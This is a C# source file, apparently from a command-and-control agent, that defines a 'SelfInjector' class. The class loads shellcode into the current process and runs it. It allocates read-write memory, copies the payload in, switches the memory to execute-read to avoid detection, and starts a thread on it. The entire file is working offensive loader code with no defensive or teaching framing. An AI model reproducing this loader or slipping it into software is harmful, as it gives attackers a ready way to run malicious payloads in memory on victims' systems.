using AgentClient.Infrastructure.Native;
using System.Runtime.InteropServices;

namespace AgentClient.Application.Services.InjectService
{
    public class SelfInjector : InjectorService
    {
        public override bool Inject(byte[] shellcode, int pid = 0)
        {
            if (shellcode == null || shellcode.Length == 0)
            {
                throw new ArgumentException("ShellCode cannot be null or empty", nameof(shellcode));
            }
            
            var baseAddress = Kernel32.VirtualAlloc(
                nint.Zero,
                shellcode.Length,
                Kernel32.AllocationType.Commit | Kernel32.AllocationType.Reserve,
                Kernel32.MemoryProtection.ReadWrite);

            // copies shellcode to baseAddress memory allocation
            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            Kernel32.VirtualProtect(
                baseAddress,
                shellcode.Length,
                Kernel32.MemoryProtection.ExecuteRead,
                out _);

            Kernel32.CreateThread(
                nint.Zero,
                0,
                baseAddress,
                nint.Zero,
                0,
                out var threadId);

            return threadId != nint.Zero;
        }
    }
}
